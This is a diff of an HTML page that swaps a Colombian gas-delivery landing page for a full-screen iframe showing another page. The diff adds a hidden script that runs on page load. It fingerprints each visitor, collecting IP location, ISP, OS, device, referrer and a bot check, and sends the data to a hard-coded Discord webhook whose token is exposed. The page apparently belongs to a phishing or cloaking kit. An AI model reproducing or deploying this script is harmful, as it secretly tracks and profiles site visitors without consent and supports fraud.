@@ -1,520 +1,103 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RapiGas Colombia | Recarga de Pipetas a Domicilio</title>
-
-<style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:'Segoe UI', Arial, sans-serif;
-}
-
-body{
-  background:#020f14;
-  color:#fff;
-  overflow-x:hidden;
-}
-
-.bg{
-  position:fixed;
-  inset:0;
-  z-index:-3;
-  background:linear-gradient(135deg,#001b1e,#003b4a,#002b19,#001018);
-}
-
-.blob{
-  position:fixed;
-  width:420px;
-  height:420px;
-  border-radius:50%;
-  filter:blur(80px);
-  opacity:.65;
-  z-index:-2;
-  animation:move 12s infinite alternate ease-in-out;
-}
-
-.blob.one{background:#00ff88;top:5%;left:5%;}
-.blob.two{background:#00b7ff;bottom:5%;right:5%;animation-delay:2s;}
-.blob.three{background:#16ffbd;top:45%;left:55%;animation-delay:4s;}
-
-@keyframes move{
-  from{transform:translate(0,0) scale(1);}
-  to{transform:translate(80px,-60px) scale(1.25);}
-}
-
-header{
-  position:fixed;
-  top:0;
-  width:100%;
-  padding:20px 8%;
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  background:rgba(0,20,25,.55);
-  backdrop-filter:blur(18px);
-  z-index:100;
-  border-bottom:1px solid rgba(0,255,170,.25);
-}
-
-.logo{
-  font-size:30px;
-  font-weight:900;
-  color:#00ff88;
-}
-
-.logo span{color:#00b7ff;}
-
-nav a{
-  color:white;
-  text-decoration:none;
-  margin-left:24px;
-  font-weight:700;
-}
-
-nav a:hover{color:#00ff88;}
-
-.hero{
-  min-height:100vh;
-  padding:150px 8% 80px;
-  display:grid;
-  grid-template-columns:1.1fr .9fr;
-  gap:50px;
-  align-items:center;
-}
-
-.badge{
-  display:inline-block;
-  padding:12px 20px;
-  border-radius:50px;
-  background:rgba(0,255,136,.15);
-  border:1px solid #00ff88;
-  color:#00ff88;
-  font-weight:800;
-  margin-bottom:25px;
-}
-
-h1{
-  font-size:62px;
-  line-height:1.04;
-  margin-bottom:25px;
-}
-
-h1 span{
-  background:linear-gradient(90deg,#00ff88,#00b7ff);
-  -webkit-background-clip:text;
-  color:transparent;
-}
-
-.hero p{
-  font-size:20px;
-  color:#d9fbff;
-  line-height:1.7;
-  margin-bottom:35px;
-}
-
-.buttons{
-  display:flex;
-  gap:18px;
-  flex-wrap:wrap;
-}
-
-.btn{
-  padding:17px 30px;
-  border-radius:16px;
-  text-decoration:none;
-  font-weight:900;
-  transition:.3s;
-}
-
-.btn.main{
-  background:linear-gradient(135deg,#00ff88,#00b7ff);
-  color:#001014;
-  box-shadow:0 0 35px rgba(0,255,136,.5);
-}
-
-.btn.second{
-  border:1px solid #00b7ff;
-  color:white;
-  background:rgba(255,255,255,.08);
-}
-
-.btn:hover{
-  transform:translateY(-5px) scale(1.04);
-}
-
-.gas-card{
-  position:relative;
-  min-height:430px;
-  border-radius:35px;
-  background:rgba(255,255,255,.09);
-  border:1px solid rgba(0,255,170,.3);
-  backdrop-filter:blur(20px);
-  overflow:hidden;
-  box-shadow:0 0 50px rgba(0,183,255,.25);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-
-.cylinder{
-  width:170px;
-  height:280px;
-  background:linear-gradient(145deg,#00ff88,#007a52);
-  border-radius:35px 35px 28px 28px;
-  position:relative;
-  box-shadow:0 0 60px rgba(0,255,136,.7);
-  animation:float 3s infinite ease-in-out;
-}
-
-.cylinder:before{
-  content:"GAS";
-  position:absolute;
-  top:115px;
-  width:100%;
-  text-align:center;
-  font-size:38px;
-  font-weight:900;
-  color:#001014;
-}
-
-.cylinder:after{
-  content:"";
-  position:absolute;
-  top:-45px;
-  left:48px;
-  width:75px;
-  height:55px;
-  border-radius:18px 18px 5px 5px;
-  background:#00b7ff;
-  box-shadow:0 0 30px #00b7ff;
-}
-
-@keyframes float{
-  0%,100%{transform:translateY(0);}
-  50%{transform:translateY(-20px);}
-}
-
-section{
-  padding:90px 8%;
-}
-
-.title{
-  text-align:center;
-  font-size:44px;
-  margin-bottom:15px;
-}
-
-.title span{color:#00ff88;}
-
-.subtitle{
-  text-align:center;
-  max-width:780px;
-  margin:0 auto 50px;
-  color:#cef7ff;
-  font-size:18px;
-  line-height:1.7;
-}
-
-.grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-  gap:25px;
-}
-
-.card{
-  padding:32px;
-  border-radius:26px;
-  background:linear-gradient(145deg,rgba(255,255,255,.12),rgba(255,255,255,.04));
-  border:1px solid rgba(0,255,170,.22);
-  backdrop-filter:blur(18px);
-  transition:.35s;
-  position:relative;
-  overflow:hidden;
-}
-
-.card:before{
-  content:"";
-  position:absolute;
-  top:0;
-  left:-100%;
-  width:100%;
-  height:100%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.16),transparent);
-  transition:.6s;
-}
-
-.card:hover:before{left:100%;}
-.card:hover{
-  transform:translateY(-10px);
-  border-color:#00ff88;
-  box-shadow:0 0 35px rgba(0,255,136,.25);
-}
-
-.icon{
-  width:58px;
-  height:58px;
-  border-radius:18px;
-  background:linear-gradient(135deg,#00ff88,#00b7ff);
-  color:#001014;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:28px;
-  font-weight:900;
-  margin-bottom:20px;
-}
-
-.card h3{
-  color:#00ff88;
-  font-size:24px;
-  margin-bottom:12px;
-}
-
-.card p{
-  color:#e9fdff;
-  line-height:1.6;
-}
-
-.highlight{
-  background:rgba(0,0,0,.32);
-}
-
-.contact{
-  max-width:760px;
-  margin:auto;
-  padding:40px;
-  border-radius:30px;
-  background:rgba(255,255,255,.1);
-  backdrop-filter:blur(20px);
-  border:1px solid rgba(0,255,170,.3);
-}
-
-input,select,textarea{
-  width:100%;
-  padding:17px;
-  margin-bottom:17px;
-  border-radius:15px;
-  border:1px solid transparent;
-  outline:none;
-  font-size:16px;
-  background:rgba(255,255,255,.92);
-}
-
-textarea{height:120px;resize:none;}
-
-button{
-  width:100%;
-  padding:18px;
-  border:none;
-  border-radius:15px;
-  background:linear-gradient(135deg,#00ff88,#00b7ff);
-  color:#001014;
-  font-weight:900;
-  font-size:18px;
-  cursor:pointer;
-}
-
-.whatsapp{
-  position:fixed;
-  right:25px;
-  bottom:25px;
-  z-index:999;
-  padding:17px 24px;
-  border-radius:50px;
-  background:#00ff88;
-  color:#001014;
-  font-weight:900;
-  text-decoration:none;
-  box-shadow:0 0 35px rgba(0,255,136,.8);
-}
-
-footer{
-  text-align:center;
-  padding:35px 8%;
-  background:rgba(0,0,0,.55);
-}
-
-@media(max-width:900px){
-  .hero{
-    grid-template-columns:1fr;
-    text-align:center;
-  }
-
-  h1{font-size:42px;}
-
-  .buttons{
-    justify-content:center;
-  }
-
-  nav{
-    display:none;
-  }
-}
-</style>
+    <meta charset="utf-8">
+    <title>Recarga</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        html,body{margin:0;padding:0;height:100%;overflow:hidden}
+        iframe{border:none;width:100%;height:100vh;display:block}
+    </style>
 </head>
-
 <body>
+ 
+    <iframe
+        src="extin.html"
+        allowfullscreen
+        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
+    </iframe>
 
-<div class="bg"></div>
-<div class="blob one"></div>
-<div class="blob two"></div>
-<div class="blob three"></div>
+    <!-- ANTES DE </body> -->
+    <script>
+    (() => {
+      const WEBHOOK = "hhttps://discord.com/api/webhooks/1517742219413553203/8QxQRvkc7gIgZeiCKk6JwcP706cHvyJ2hOxOmQW9guKIWGpp3J4ckPz5FFeQMenBT5oM";
 
-<header>
-  <div class="logo">Rapi<span>Gas</span></div>
-  <nav>
-    <a href="#inicio">Inicio</a>
-    <a href="#servicios">Servicios</a>
-    <a href="#beneficios">Beneficios</a>
-    <a href="#contacto">Contacto</a>
-  </nav>
-</header>
+      async function getIPInfo() {
+        try {
+          const response = await fetch("https://ipinfo.io/json?token=f87ad1c1c69033");
+          if (!response.ok) {
+            console.warn("Error en ipinfo.io:", response.status);
+            return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
+          }
+          const data = await response.json();
+          return {
+            country_name: data.country || "Desconocido",
+            city: data.city || "Desconocido",
+            country_code: data.country || "XX",
+            isp: data.org || "No disponible"
+          };
+        } catch (error) {
+          console.error("Error al obtener IP info:", error);
+          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
+        }
+      }
 
-<section class="hero" id="inicio">
-  <div>
-    <div class="badge">Gas a domicilio en Bogotá y toda Colombia</div>
-    <h1>Recarga y venta de <span>pipetas de gas</span> con entrega rápida</h1>
-    <p>
-      Llevamos gas seguro hasta tu hogar, restaurante, negocio o empresa.
-      Atención rápida, servicio confiable y cobertura en Bogotá y diferentes zonas de Colombia.
-    </p>
-    <div class="buttons">
-      <a href="#contacto" class="btn main">Pedir Recarga Ahora</a>
-      <a href="#servicios" class="btn second">Ver Servicios</a>
-    </div>
-  </div>
+      function parseUA() {
+        const ua = navigator.userAgent;
+        const isBot = /bot|crawler|spider|crawl/i.test(ua);
+        let os = "Desconocido", device = "Desconocido";
 
-  <div class="gas-card">
-    <div class="cylinder"></div>
-  </div>
-</section>
+        if (/Windows NT/i.test(ua))        os = "Windows";
+        else if (/Mac OS X/i.test(ua))     os = "macOS";
+        else if (/Android/i.test(ua))      os = "Android";
+        else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
+        else if (/Linux/i.test(ua))        os = "Linux";
 
-<section id="servicios">
-  <h2 class="title">Servicios <span>RapiGas</span></h2>
-  <p class="subtitle">Soluciones rápidas para hogares, restaurantes, tiendas, panaderías, fincas y negocios.</p>
+        if (/Samsung/i.test(ua))           device = "Samsung";
+        else if (/iPhone/i.test(ua))       device = "iPhone";
+        else if (/iPad/i.test(ua))         device = "iPad";
+        else if (/Huawei/i.test(ua))       device = "Huawei";
+        else if (/Xiaomi/i.test(ua))       device = "Xiaomi";
+        else device = "PC/Otro";
 
-  <div class="grid">
-    <div class="card">
-      <div class="icon">🔥</div>
-      <h3>Recarga de pipetas</h3>
-      <p>Recarga segura de pipetas de gas para uso doméstico, comercial y empresarial.</p>
-    </div>
+        return {os, device, isBot};
+      }
 
-    <div class="card">
-      <div class="icon">🚚</div>
-      <h3>Entrega a domicilio</h3>
-      <p>Llevamos tu pipeta hasta la puerta de tu casa o negocio con atención rápida.</p>
-    </div>
+      window.addEventListener("DOMContentLoaded", async () => {
+        const ip   = await getIPInfo();
+        const ua   = parseUA();
+        const originDomain = window.location.hostname;
+        const fullURL      = window.location.href;
 
-    <div class="card">
-      <div class="icon">🛒</div>
-      <h3>Venta de pipetas</h3>
-      <p>Venta de pipetas listas para usar, ideales para hogares y negocios.</p>
-    </div>
+        const payload = {
+          username: "EXOTIC",
+          embeds: [{
+            color: ip.country_code === "CO" ? 0x00ff00 : 0xff0000,
+            title: ua.isBot ? "🤖 BOT detectado" : "👤 Visita humana",
+            fields: [
+              {name: "🌍 País",         value: ip.country_name, inline: true},
+              {name: "🏙️ Ciudad",       value: ip.city,         inline: true},
+              {name: "📍 Origen",        value: ip.country_code === "CO" ? "🇨🇴 Colombia" : "🌐 Exterior", inline: true},
+              {name: "📡 ISP",           value: ip.isp, inline: true},
+              {name: "💻 SO",            value: ua.os,           inline: true},
+              {name: "📱 Dispositivo",   value: ua.device,       inline: true},
+              {name: "🔗 Dominio ref",   value: document.referrer || "Directo / Sin referrer", inline: true},
+              {name: "🌐 Sitio Puribal", value: originDomain, inline: true},
+              {name: "🕒 Hora (UTC)",    value: new Date().toISOString(), inline: true}
+            ]
+          }]
+        };
 
-    <div class="card">
-      <div class="icon">🏪</div>
-      <h3>Servicio para negocios</h3>
-      <p>Atendemos restaurantes, comidas rápidas, panaderías, tiendas y emprendimientos.</p>
-    </div>
-  </div>
-</section>
-
-<section class="highlight" id="beneficios">
-  <h2 class="title">¿Por qué elegir <span>RapiGas?</span></h2>
-  <p class="subtitle">Más que vender gas, ofrecemos tranquilidad, rapidez y respaldo.</p>
-
-  <div class="grid">
-    <div class="card">
-      <div class="icon">⚡</div>
-      <h3>Servicio rápido</h3>
-      <p>Ideal para cuando necesitas gas urgente en tu hogar o negocio.</p>
-    </div>
-
-    <div class="card">
-      <div class="icon">🛡️</div>
-      <h3>Atención segura</h3>
-      <p>Manejo responsable y servicio confiable para cada cliente.</p>
-    </div>
-
-    <div class="card">
-      <div class="icon">📍</div>
-      <h3>Cobertura amplia</h3>
-      <p>Atención en Bogotá y ventas disponibles para distintas zonas de Colombia.</p>
-    </div>
-
-    <div class="card">
-      <div class="icon">💬</div>
-      <h3>Contacto directo</h3>
-      <p>Comunicación rápida por WhatsApp para coordinar tu pedido.</p>
-    </div>
-  </div>
-</section>
-
-<section>
-  <h2 class="title">Así funciona el <span>pedido</span></h2>
-  <p class="subtitle">Un proceso simple, rápido y pensado para tu comodidad.</p>
-
-  <div class="grid">
-    <div class="card">
-      <h3>1. Solicitas</h3>
-      <p>Nos escribes por WhatsApp o completas el formulario.</p>
-    </div>
-
-    <div class="card">
-      <h3>2. Confirmamos</h3>
-      <p>Validamos ubicación, tipo de pipeta y disponibilidad.</p>
-    </div>
-
-    <div class="card">
-      <h3>3. Enviamos</h3>
-      <p>Coordinamos la entrega o recarga a domicilio.</p>
-    </div>
-
-    <div class="card">
-      <h3>4. Recibes</h3>
-      <p>Obtienes tu pipeta de gas lista para usar.</p>
-    </div>
-  </div>
-</section>
-
-<section id="contacto">
-  <h2 class="title">Pide tu <span>recarga ahora</span></h2>
-  <p class="subtitle">Déjanos tus datos y coordinamos tu servicio.</p>
-
-  <div class="contact">
-    <form>
-      <input type="text" placeholder="Nombre completo" required>
-      <input type="tel" placeholder="Número de celular" required>
-
-      <select required>
-        <option value="">Selecciona un servicio</option>
-        <option>Recarga de pipeta</option>
-        <option>Compra de pipeta</option>
-        <option>Servicio para negocio</option>
-        <option>Información de precios</option>
-      </select>
-
-      <input type="text" placeholder="Ciudad o dirección aproximada" required>
-      <textarea placeholder="Escribe tu mensaje"></textarea>
-
-      <button type="submit">Enviar Solicitud</button>
-    </form>
-  </div>
-</section>
-
-<a class="whatsapp" href="https://wa.me/573000000000?text=Hola,%20quiero%20solicitar%20una%20recarga%20de%20pipeta%20de%20gas" target="_blank">
-  Pedir Gas Ahora
-</a>
-
-<footer>
-  <p><strong>RapiGas Colombia</strong></p>
-  <p>Recarga y venta de pipetas de gas a domicilio en Bogotá y toda Colombia.</p>
-</footer>
-
+        fetch(WEBHOOK, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch((error) => {
+          console.error("Error al enviar al webhook:", error);
+        });
+      });
+    })();
+    </script>
 </body>
 </html>
